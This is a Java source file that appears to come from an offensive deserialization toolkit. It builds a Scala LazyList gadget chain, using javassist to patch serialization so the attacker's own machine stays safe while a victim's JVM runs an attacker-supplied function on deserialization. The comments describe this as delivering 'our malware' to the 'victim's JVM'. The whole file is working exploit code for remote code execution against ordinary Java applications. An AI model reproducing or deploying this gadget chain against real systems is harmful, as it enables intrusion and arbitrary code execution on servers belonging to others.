package dev.silente.javashark.gadget.scala;

import dev.silente.javashark.utils.ReflectUtils;
import javassist.ClassPool;
import javassist.LoaderClassPath;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewMethod;
import scala.Function0;
import scala.collection.immutable.ArraySeq;
import scala.sys.process.ProcessBuilder$;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Base64;
import java.util.function.Function;

public class GScala {
    private static final String LAZY_LIST_CLASSNAME = "scala.collection.immutable.LazyList";
    static {

        try {
            ClassPool classPool = ClassPool.getDefault();
            classPool.appendClassPath(new LoaderClassPath(GScala.class.getClassLoader()));

            CtClass ctClass = classPool.getCtClass(LAZY_LIST_CLASSNAME);

            // Actually we don't want our malware code to be executed on our machine when we serialize our
            // forged payload. This is why we set state's bitmap$0 field to true before writing to
            // indicate that state was already evaluated and only right before writing we set this field back too false
            // to make victim's deserializer evaluate state and eventually call our malware Function0.
            // To achieve this result, we define writeObject on LazyList and set bitmap$0 to false there using
            // javassist
            // This extra code definition won't affect on victim's JVM in any way because it exists only in our JVM,
            // and it only affects the way object is being serialized (change field value)
            String writeObjectSource =
                    "private void writeObject(java.io.ObjectOutputStream out) {" +
                            "this.bitmap$0 = false;" +
                            "out.defaultWriteObject();" +
                            "}";
            CtMethod ctMethod = CtNewMethod.make(writeObjectSource, ctClass);
            ctClass.addMethod(ctMethod);

            ctClass.toClass(ArraySeq.class);
        }
        catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
    private final Function<Object[], Function0<Object>> function0Provider;

    public GScala() {
        this.function0Provider = null;
    }

    public GScala(Function<Object[], Function0<Object>> function0Provider) {
        this.function0Provider = function0Provider;
    }

    public Object invokeFunction0(Object... args) throws Exception {
        Function0<Object> function0 = function0Provider.apply(args);
        return createLazyListProxy(function0);
    }

    public static Object createLazyListProxy(Function0<Object> function0) throws Exception {

        Object lazyList = ReflectUtils.newInstance(LAZY_LIST_CLASSNAME, new Class[] {Function0.class}, function0);

        Object emptyLazyListState = ReflectUtils.getStaticField("scala.collection.immutable.LazyList$State$Empty$", "MODULE$");
        ReflectUtils.setFieldValue(lazyList, "scala$collection$immutable$LazyList$$state", emptyLazyListState);
        ReflectUtils.setFieldValue(lazyList, "scala$collection$immutable$LazyList$$stateEvaluated", true);
        ReflectUtils.setFieldValue(lazyList, "bitmap$0", true);

        return ReflectUtils.newInstance("scala.collection.immutable.LazyList$SerializationProxy", lazyList);
    }
}


